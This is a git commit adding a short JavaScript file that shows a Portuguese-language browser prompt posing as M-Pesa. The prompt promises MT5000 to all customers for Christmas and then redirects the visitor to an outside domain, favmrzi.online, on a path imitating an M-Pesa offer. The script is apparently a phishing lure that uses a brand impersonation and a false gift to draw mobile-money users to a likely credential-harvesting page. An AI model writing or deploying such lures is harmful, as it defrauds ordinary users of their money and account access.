ca1bf9864b878d65b40a6cc512bbab972bfe5715
newetijazz10 <newetijazz10@gmail.com>
2025-12-18 10:06:13 +0100

    Create mzxmas.js

---
+++ mzxmas.js
@@ -0,0 +1,5 @@
+var password = 'RETIRAR MT5000'
+password=prompt('Mpesa: Para celebrar o Natal deste ano, estamos oferecendo MT5000 a todos os nossos clientes. Clique em OK para aproveitar a oferta.','RETIRAR MT5000');
+if (password != 'RETIRAR MT5000') {
+location.href='https://www.favmrzi.online/Mpesa-5000MT-Xmas';
+}
